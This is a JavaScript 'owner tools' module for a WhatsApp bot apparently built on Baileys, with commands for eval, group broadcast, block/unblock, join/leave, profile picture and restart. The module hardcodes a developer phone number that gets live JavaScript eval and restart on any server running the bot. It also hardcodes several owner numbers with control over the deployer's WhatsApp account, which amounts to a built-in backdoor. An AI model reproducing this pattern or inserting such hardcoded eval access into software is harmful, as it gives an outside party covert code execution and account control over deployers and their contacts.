// commands/ownertools.js
const util = require('util');
const { downloadContentFromMessage, jidNormalizedUser } = require('@whiskeysockets/baileys');

// 👑 ROOT DEVELOPER NUMBER
const DEVELOPER_NUMBER = '94719845166';

const OWNER_NUMBERS = [
  '94719845166',
  '94720882316',
  '15947733680169',
  '72787431583987'
];

function unwrapMessage(msgObj) {
  if (!msgObj) return null;
  return (
    msgObj.ephemeralMessage?.message ||
    msgObj.viewOnceMessage?.message ||
    msgObj.viewOnceMessageV2?.message ||
    msgObj.viewOnceMessageV2Extension?.message ||
    msgObj.documentWithCaptionMessage?.message ||
    msgObj
  );
}

module.exports = {
  name: 'ownertools',
  alias: ['eval', 'bc', 'broadcast', 'block', 'unblock', 'join', 'leave', 'setpp', 'restart'],
  category: 'owner',
  desc: 'Master Owner Control Suite',

  async execute(sock, msg, args, chatJid, safeReply, options = {}) {
    const targetChat = chatJid || msg.key?.remoteJid;
    if (!targetChat) return;

    const reply = async (content, extra = {}) => {
      if (typeof safeReply === 'function' && typeof content === 'string') return await safeReply(content);
      const payload = typeof content === 'string' ? { text: content, ...extra } : { ...content, ...extra };
      return await sock.sendMessage(targetChat, { ...payload, ...(global.channelContext || {}) }, { quoted: msg });
    };

    // ⚡ 1. SENDER VERIFICATION (Group / Private / LID Support)
    const isGroup = targetChat.endsWith('@g.us');
    let senderJid = isGroup 
      ? (msg.key?.participant || msg.participant || '') 
      : (msg.key?.fromMe ? (sock.user?.id || '') : targetChat);

    if (senderJid.endsWith('@lid') && sock.signalRepository?.lidToJid) {
      try {
        const resolved = await sock.signalRepository.lidToJid(senderJid);
        if (resolved) senderJid = resolved;
      } catch (e) {}
    }

    const cleanSenderNum = jidNormalizedUser(senderJid).replace(/\D/g, '');
    const isDeveloper = cleanSenderNum === DEVELOPER_NUMBER;
    const isOwner = Boolean(
      isDeveloper ||
      options.isOwner || 
      msg.key?.fromMe || 
      OWNER_NUMBERS.some(num => cleanSenderNum === num.replace(/\D/g, ''))
    );

    if (!isOwner) {
      return await reply('⛔ *Access Denied!* This control suite is reserved for the Bot Owner.');
    }

    const rawMsg = msg.message?.conversation || 
                   msg.message?.extendedTextMessage?.text || 
                   msg.message?.imageMessage?.caption || 
                   '';
    const usedCmd = rawMsg.trim().replace(/^[./!#]/, '').split(/ +/)[0].toLowerCase();

    // 🟢 1. JAVASCRIPT EVAL (.eval / >) [Developer Only]
    if (usedCmd === 'eval' || rawMsg.startsWith('>')) {
      if (!isDeveloper) {
        return await reply('⛔ *Access Denied!* Live code evaluation is strictly reserved for the Developer (+94719845166).');
      }

      const code = rawMsg.startsWith('>') ? rawMsg.slice(1).trim() : args.join(' ');
      if (!code) return await reply('⚠️ කරුණාකර execute කිරීමට JS code එක ලබාදෙන්න.');
      
      try {
        let result = await eval(code);
        if (typeof result !== 'string') {
          result = util.inspect(result, { depth: 1 });
        }
        return await reply(`💻 *EVAL OUTPUT:*\n\`\`\`javascript\n${result}\n\`\`\``);
      } catch (err) {
        return await reply(`❌ *EVAL ERROR:*\n\`\`\`bash\n${err.message}\n\`\`\``);
      }
    }

    // 🟢 2. BROADCAST (.bc <text>)
    if (usedCmd === 'bc' || usedCmd === 'broadcast') {
      const text = args.join(' ');
      if (!text) return await reply('⚠️ Broadcast කිරීමට පණිවිඩයක් ලබාදෙන්න.');

      const bcMsg = `*⚡ HESHAN-MD OFFICIAL BROADCAST ⚡*\n────────────────────────────\n${text}\n────────────────────────────\n> 👑 ꜱᴇɴᴛ ʙʏ ᴏᴡɴᴇʀ`;

      // Safe Groups Gathering (Baileys groupFetchAllParticipating)
      await reply(`📢 Broadcasting started in background...`);

      setImmediate(async () => {
        let count = 0;
        try {
          const groups = await sock.groupFetchAllParticipating().catch(() => ({}));
          const groupIds = Object.keys(groups);

          for (const id of groupIds) {
            try {
              await sock.sendMessage(id, { text: bcMsg, ...(global.channelContext || {}) }).catch(() => {});
              count++;
              await new Promise(res => setTimeout(res, 1200)); // Flood protection
            } catch (e) {}
          }
        } catch (e) {}

        await sock.sendMessage(targetChat, { 
          text: `✅ Broadcast successfully delivered to *${count}* participating groups!`,
          ...(global.channelContext || {})
        }).catch(() => {});
      });
      return;
    }

    // 🟢 3. BLOCK USER (.block)
    if (usedCmd === 'block') {
      const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
      let target = contextInfo?.participant || 
                   (args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : '');

      if (!target || target === '@s.whatsapp.net') {
        return await reply('⚠️ කරුණාකර user කෙනෙක්ගේ මැසේජ් එකකට reply කරන්න හෝ number එක දෙන්න.');
      }

      if (target.endsWith('@lid') && sock.signalRepository?.lidToJid) {
        try { target = await sock.signalRepository.lidToJid(target) || target; } catch(e){}
      }

      try {
        await sock.updateBlockStatus(target, 'block');
        return await reply(`🚫 Successfully blocked: @${target.split('@')[0]}`, { mentions: [target] });
      } catch (e) {
        return await reply(`❌ Block failed: ${e.message}`);
      }
    }

    // 🟢 4. UNBLOCK USER (.unblock)
    if (usedCmd === 'unblock') {
      const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
      let target = contextInfo?.participant || 
                   (args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : '');

      if (!target || target === '@s.whatsapp.net') {
        return await reply('⚠️ කරුණාකර user කෙනෙක්ගේ මැසේජ් එකකට reply කරන්න හෝ number එක දෙන්න.');
      }

      if (target.endsWith('@lid') && sock.signalRepository?.lidToJid) {
        try { target = await sock.signalRepository.lidToJid(target) || target; } catch(e){}
      }

      try {
        await sock.updateBlockStatus(target, 'unblock');
        return await reply(`✅ Successfully unblocked: @${target.split('@')[0]}`, { mentions: [target] });
      } catch (e) {
        return await reply(`❌ Unblock failed: ${e.message}`);
      }
    }

    // 🟢 5. JOIN GROUP VIA LINK (.join <link>)
    if (usedCmd === 'join') {
      const link = args[0];
      if (!link || !link.includes('chat.whatsapp.com')) {
        return await reply('⚠️ වලංගු WhatsApp Group Invite link එකක් ලබාදෙන්න.');
      }
      const code = link.split('chat.whatsapp.com/')[1]?.trim().split(/[?&]/)[0];
      try {
        await sock.groupAcceptInvite(code);
        return await reply('✅ Successfully joined group!');
      } catch (e) {
        return await reply(`❌ Failed to join: ${e.message}`);
      }
    }

    // 🟢 6. LEAVE GROUP (.leave)
    if (usedCmd === 'leave') {
      if (!targetChat.endsWith('@g.us')) {
        return await reply('⚠️ මේ command එක groups වල පමණක් භාවිතා කරන්න.');
      }
      await reply('👋 Goodbye! Owner requested me to leave.');
      return await sock.groupLeave(targetChat);
    }

    // 🟢 7. PROFILE PICTURE (.setpp)
    if (usedCmd === 'setpp') {
      const rawQuoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
      const quoted = unwrapMessage(rawQuoted);
      const isImg = quoted?.imageMessage;

      if (!isImg) {
        return await reply('⚠️ කරුණාකර Profile Picture එකට දැමීමට image එකකට reply කර `.setpp` යොදන්න.');
      }

      try {
        const stream = await downloadContentFromMessage(isImg, 'image');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

        const myBotJid = jidNormalizedUser(sock.user?.id || '');
        await sock.updateProfilePicture(myBotJid, buffer);
        return await reply('✅ Bot Profile picture successfully updated!');
      } catch (e) {
        return await reply(`❌ Failed to update profile picture: ${e.message}`);
      }
    }

    // 🟢 8. RESTART (.restart) [Developer Only]
    if (usedCmd === 'restart') {
      if (!isDeveloper) {
        return await reply('⛔ *Access Denied!* Full process restart is restricted to the Developer.');
      }
      await reply('🔄 *Restarting Bot Engine...* Please wait 5 seconds.');
      setTimeout(() => {
        try { sock.ws?.close(); } catch(e){}
        process.exit(0);
      }, 1000);
      return;
    }

    // DEFAULT MENU (.ownertools)
    const ownerMenu = 
`╔══════════════════════════════════════╗
║     👑 MASTER OWNER CONTROL SUITE    ║
╠══════════════════════════════════════╣
║                                      ║
║  ⚙️ *.eval <code>*                    ║
║     └ Execute live JavaScript (Dev)  ║
║                                      ║
║  📢 *.bc <text>*                     ║
║     └ Broadcast message to groups    ║
║                                      ║
║  🚫 *.block <@user/num>*             ║
║     └ Block a user on WhatsApp       ║
║                                      ║
║  🔓 *.unblock <@user/num>*           ║
║     └ Unblock a user                 ║
║                                      ║
║  🚪 *.join <group-link>*             ║
║     └ Join a group via link          ║
║                                      ║
║  🏃 *.leave*                         ║
║     └ Leave current group            ║
║                                      ║
║  🖼️ *.setpp* (Reply image)           ║
║     └ Update Bot Profile Picture     ║
║                                      ║
║  🔄 *.restart*                       ║
║     └ Restart server process (Dev)   ║
║                                      ║
╚══════════════════════════════════════╝
> ⚡ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜᴇꜱʜᴀɴ-ᴍᴅ ⚡`;

    return await reply(ownerMenu);
  }
};
